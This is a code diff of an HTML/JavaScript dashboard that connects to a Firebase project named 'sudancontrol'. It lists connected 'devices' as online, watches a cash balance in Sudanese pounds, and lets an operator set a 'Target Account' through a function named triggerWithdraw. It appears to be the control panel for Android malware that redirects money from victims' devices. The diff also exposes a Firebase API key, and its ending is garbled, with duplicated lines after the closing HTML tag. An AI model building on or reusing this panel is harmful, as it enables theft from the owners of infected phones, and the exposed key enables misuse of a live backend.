@@ -19,7 +19,7 @@
         .btn-primary { background: var(--primary); color: white; }
         .btn-danger { background: var(--danger); color: white; margin-top: 10px; }
         
-        /* Pulse Animation for Alerts */
+        /* Notification Pulse */
         .alert-pulse { animation: pulse-red 1s infinite; border-color: var(--danger) !important; }
         @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(218, 54, 51, 0); } 100% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0); } }
 
@@ -54,15 +54,14 @@
     </div>
 
     <div class="card">
-        <h3 style="margin-top:0">Withdrawal Target</h3>
-        <div class="label">Receiver Account</div>
-        <input type="text" id="account-input" placeholder="Enter Account Number">
-        <button class="btn-primary" onclick="setTarget()">Update & Trigger</button>
+        <h3 style="margin-top:0">Control Panel</h3>
+        <div class="label">Target Account</div>
+        <input type="text" id="target-acc" placeholder="Enter Account Number">
+        <button class="btn-primary" onclick="triggerWithdraw()">Update Target</button>
     </div>
 </div>
 
 <script>
-    // Configuration
     const firebaseConfig = {
         apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
         authDomain: "sudancontrol-c5050.firebaseapp.com",
@@ -71,45 +70,73 @@
         appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
     };
 
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
     const db = firebase.database();
 
-    // Live Balance Monitor
+    // مراقب الأجهزة المحدث (يتعامل مع "الأطفال" ومع "النص البسيط")
+    db.ref('activate').on('value', (snap) => {
+        const listDiv = document.getElementById('activate-list');
+        const countDisplay = document.getElementById('device-count');
+        listDiv.innerHTML = "";
+        let count = 0;
+
+        if (snap.exists()) {
+            const data = snap.val();
+            
+            if (typeof data === 'object') {
+                // التعامل مع قائمة أطفال
+                Object.keys(data).forEach((key) => {
+                    count++;
+                    listDiv.innerHTML += `
+                        <div class="device-row">
+                            <span class="device-id">${key}</span>
+                            <span style="color: #238636;">Online</span>
+                        </div>`;
+                });
+            } else {
+                // التعامل مع نص بسيط (قيمة واحدة)
+                count = 1;
+                listDiv.innerHTML = `
+                    <div class="device-row">
+                        <span class="device-id">${data}</span>
+                        <span style="color: #238636;">Online</span>
+                    </div>`;
+            }
+        } else {
+            listDiv.innerHTML = '<div style="text-align:center; padding: 20px; color: #8b949e;">No devices connected</div>';
+        }
+        countDisplay.innerText = count;
+    });
+
+    // مراقب الرصيد
     db.ref('Cash').on('value', (snap) => {
-        if(snap.exists()) {
+        if(snap.exists()){
             document.getElementById('cash-display').innerText = snap.val() + " SDG";
             document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
-            document.getElementById('net-status').innerText = "System Live";
+            document.getElementById('net-status').innerText = "System Online";
             document.getElementById('net-status').style.color = "#238636";
             triggerAlert();
         }
     });
 
-    // Active Devices Monitor
-    db.ref('activate').on('value', (snap) => {
-        const list = document.getElementById('activate-list');
-        list.innerHTML = "";
-        let count = 0;
-        if(snap.exists()) {
-            snap.forEach((child) => {
-                count++;
-                list.innerHTML += `<div class="device-row"><span class="device-id">${child.key}</span><span>Online</span></div>`;
-            });
-        }
-        document.getElementById('device-count').innerText = count;
-    });
-
-    // Actions
-    function setTarget() {
-        const acc = document.getElementById('account-input').value;
+    function triggerWithdraw() {
+        const acc = document.getElementById('target-acc').value;
         if(acc) {
             db.ref('Account').set(acc);
-            alert("Account Updated in Firebase");
+            alert("Target Account Updated");
         }
     }
 
     function triggerAlert() {
         const card = document.getElementById('balance-card');
+        card.classList.add('alert-pulse');
+        setTimeout(() => card.classList.remove('alert-pulse'), 3000);
+    }
+</script>
+</body>
+</html>
         card.classList.add('alert-pulse');
         document.getElementById('alert-sound').play();
         setTimeout(() => card.classList.remove('alert-pulse'), 3000);
